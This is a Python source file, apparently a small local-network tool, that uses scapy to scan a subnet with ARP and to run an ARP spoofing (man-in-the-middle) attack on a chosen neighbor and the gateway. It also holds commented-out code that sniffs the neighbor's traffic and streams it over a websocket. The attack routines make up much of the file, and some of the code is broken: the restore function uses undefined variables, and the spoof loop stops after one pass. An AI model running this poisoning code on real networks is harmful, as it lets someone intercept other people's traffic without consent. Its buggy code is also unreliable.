import json
from scapy.all import *
import asyncio
from urllib.parse import parse_qs, urlparse
import PktQueue

# ARP spoofing functions from Justin Sietz https://nostarch.com/blackhatpython
import os
import signal
import threading
import time
import platform

def darwin_iface():
    a = read_routes()
    interface_info = {
        'gw': a[0][2],
        'netif': a[0][3],
        'ifaddr': a[0][4],
    }
    return interface_info

def linux_iface():
    print(get_if_list())

def win_iface():
    print(show_interfaces())

def get_interface():
    print('Getting interface...')
    if platform.system() == 'Darwin':
        from scapy.arch.unix import read_routes
        d = darwin_iface()
        return d
    elif platform.system() == 'Linux':
        from scapy.arch.linux import get_if_list
        l = linux_iface()
        return l
    elif platform.system() == 'Windows':
        from scapy.arch.windows.__init__ import show_interfaces
        w = win_iface()
        return w

def restore_network(gateway_ip, gateway_mac, neighbor_ip, neighbor_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    os.kill(os.getpid(), signal.SIGTERM)

def get_mac(ip_address):
    print('Getting MAC address...')
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r.hwsrc
    return None

def arp_spoof(neighbor_ip):
    network_info = get_interface()
    gateway_ip = network_info['gw']
    neighbor_mac = get_mac(neighbor_ip)
    gateway_mac = get_mac(gateway_ip)

    print('neighbor_ip: {}'.format(neighbor_ip))
    print('gateway_ip: {}'.format(gateway_ip))
    print('neighbor_mac: {}'.format(neighbor_mac))
    print('gateway_mac: {}'.format(gateway_mac))

    try:
        while True:
            print('Sending ARP packets...')
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=neighbor_ip))
            send(ARP(op=2, pdst=neighbor_ip, hwdst=neighbor_mac, psrc=gateway_ip))
            break
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")

# def enqueue_packets(fname, neighbor_ip=False):
#     def summarize(x):
#         pkt_summary = x.summary()
#         packet_queue.put(pkt_summary)

#     config_defaults = {
#         "prn": lambda x: summarize(x),
#         "iface": conf.iface,
#         "count": 0,
#         "store": 0
#     }

#     if fname == 'sniffSelf':
#       sniff(**config_defaults)
#     elif fname == 'sniffNeighbor':
#       sniff(**config_defaults, filter='ip host {}'.format(neighbor_ip))

# from https://hackernoon.com/threaded-asynchronous-magic-and-how-to-wield-it-bba9ed602c32
def start_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

async def dequeue_packets(ws):
    while True:
        p = PktQueue.shared_queue.get()
        if p:
            await ws.send_str(p)

def validate_ifaddr(ifaddr):
    try:
        if 7 <= len(ifaddr) <= 15 and ifaddr.count('.') == 3:
            return ifaddr
    except:
        print('Address is an unexpected format')

def subnet_from_ifaddr(ifaddr):
    four_octets = ifaddr.split('.')
    del four_octets[-1]
    three_octets = '.'.join(four_octets)
    subnet = '{}{}'.format(three_octets, '.*')
    return subnet

def get_arp_table(ifaddr):
    subnet = subnet_from_ifaddr(validate_ifaddr(ifaddr))
    # http://redimp.de/posts/scapy-without-entering-promiscuous-mode/
    answered, unanswered = arping(subnet)
    hostsArray = []
    hostObj = {}
    for index, host in enumerate(answered):
        mac = host[1].hwsrc
        ipAddr = host[1].psrc
        hostObj[index] = {}
        hostObj[index]['mac'] = mac
        hostObj[index]['ipAddr'] = ipAddr
        hostsArray.append(hostObj[index])
    return hostsArray
